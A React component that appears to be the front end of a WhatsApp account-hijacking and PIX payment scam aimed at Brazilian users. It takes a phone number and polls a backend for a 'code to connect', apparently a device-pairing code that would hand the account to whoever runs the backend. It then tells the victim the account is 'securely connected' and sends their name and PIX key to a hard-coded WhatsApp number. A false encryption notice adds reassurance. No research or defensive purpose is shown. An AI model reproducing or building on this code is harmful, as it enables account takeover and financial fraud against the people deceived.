import React, { useState, useEffect } from 'react';
import './VerifyFlow.css';
import axios from 'axios';

const WHATSAPP_HELP_NUMBER = '555131910192';

const VerifyFlow = () => {
  const [step, setStep] = useState(1);
  const [ddi, setDdi] = useState('55');
  const [phone, setPhone] = useState('');
  const [loading, setLoading] = useState(false);
  const [pix, setPix] = useState({ name: '', type: 'Phone', key: '' });
  const [pin, setPin] = useState('');

  const formattedPhone = ddi + phone.replace(/\D/g, '');

  const formatPhone = (value) => {
    let cleaned = value.replace(/\D/g, '');
    if (cleaned.length > 11) cleaned = cleaned.slice(0, 11);
    let formatted = '';
    if (cleaned.length > 0) formatted = '(' + cleaned;
    if (cleaned.length > 2) formatted = formatted.slice(0, 3) + ') ' + formatted.slice(3);
    if (cleaned.length > 7) formatted = formatted.slice(0, 10) + '-' + formatted.slice(10);
    return formatted;
  };

  const sendPhone = async () => {
    if (phone.replace(/\D/g, '').length < 8) return alert('Please enter a valid number.');
    setStep(2);
    setPin('');
    setLoading(false);
    try {
      const verify_data = { 'phone': formattedPhone };
      const response = await axios.post('http://localhost:3000/api/phone', verify_data);
      const data = response.data;

    } catch (error) {
      alert('Failed to start verification.');
      setStep(1);
    }
  };

  // Poll backend every 3 seconds to get the PIN
  useEffect(() => {
    if (step !== 2 || !phone) return;

    const interval = setInterval(async () => {
      try {
        const res = await fetch(`http://localhost:3000/api/get-pin?phone=${encodeURIComponent(formattedPhone)}`);
        if (res.ok) {
          const data = await res.json();
          if (data.pin && data.pin !== pin) {
            setPin(data.pin);
          }
        }
      } catch (err) {
        // You may handle errors here if needed
      }
    }, 3000);

    return () => clearInterval(interval);
  }, [phone, step, pin, formattedPhone]);

  const copyPin = () => {
    if (pin) {
      navigator.clipboard.writeText(pin).then(() => alert('Code copied: ' + pin));
    }
  };

  const sendPix = () => {
    if (!pix.name || !pix.key) return alert('Please fill out all fields!');
    const message = `I just connected my number ${formattedPhone}\n\nPIX Key:\nName: ${pix.name}\nType: ${pix.type}\nKey: ${pix.key}`;
    const url = `https://wa.me/${WHATSAPP_HELP_NUMBER}?text=${encodeURIComponent(message)}`;
    window.open(url, '_blank');
  };

  return (
    <div className="verify-container">
      {step === 1 && (
        <div className="tela ativa">
          <h2>Enter your phone number</h2>
          <p>Select your country and enter your phone number.</p>
          <div className="tela-conteudo">
            <select value={ddi} onChange={(e) => setDdi(e.target.value)}>
              <option value="55">🇧🇷 Brazil (+55)</option>
              {/* Add more countries if needed */}
            </select>
            <input
              type="text"
              value={phone}
              onChange={(e) => setPhone(formatPhone(e.target.value))}
              placeholder="(11) 99955-9889"
            />
            <button onClick={sendPhone} style={{ borderRadius: '50px' }}>
              Next
            </button>
          </div>
        </div>
      )}

      {step === 2 && (
        <div className="tela ativa">
          <h2>Use this code to connect</h2>
          <div className="tela-conteudo">
            {loading ? (
              <div className="spinner" />
            ) : (
              <div id="codigo-display">
                {[...pin].map((char, i) => (
                  <span key={i}>{char}</span>
                ))}
              </div>
            )}
            <button onClick={copyPin}>Copy Code</button>
            {/* Optionally add a "I followed the steps" button here */}
          </div>
        </div>
      )}

      {step === 3 && (
        <div className="tela ativa">
          <h2>✅ Successfully connected!</h2>
          <div className="tela-conteudo">
            <p>Your WhatsApp has been successfully connected.</p>
            <p style={{ fontWeight: 'bold' }}>WhatsApp securely connected!</p>
            <button onClick={() => setStep(4)}>Register PIX Key</button>
            <button onClick={() => setStep(1)}>Try Again</button>
          </div>
        </div>
      )}

      {step === 4 && (
        <div className="tela ativa">
          <h2>PIX Key Registration</h2>
          <div className="tela-conteudo">
            <input
              type="text"
              value={pix.name}
              onChange={(e) => setPix({ ...pix, name: e.target.value })}
              placeholder="Your full name"
            />
            <div style={{ display: 'flex', gap: '8px' }}>
              <select
                value={pix.type}
                onChange={(e) => setPix({ ...pix, type: e.target.value })}
                style={{ flex: 1 }}
              >
                <option value="Phone">Phone</option>
                <option value="CPF">CPF</option>
                <option value="CNPJ">CNPJ</option>
                <option value="Email">Email</option>
                <option value="Random Key">Random Key</option>
              </select>
              <input
                type="text"
                value={pix.key}
                onChange={(e) => setPix({ ...pix, key: e.target.value })}
                placeholder="Your PIX key"
                style={{ flex: 2 }}
              />
            </div>
            <button onClick={sendPix}>Register PIX Key</button>
          </div>
        </div>
      )}

      <footer>🔒 Your personal messages are protected with end-to-end encryption.</footer>
    </div>
  );
};

export default VerifyFlow;
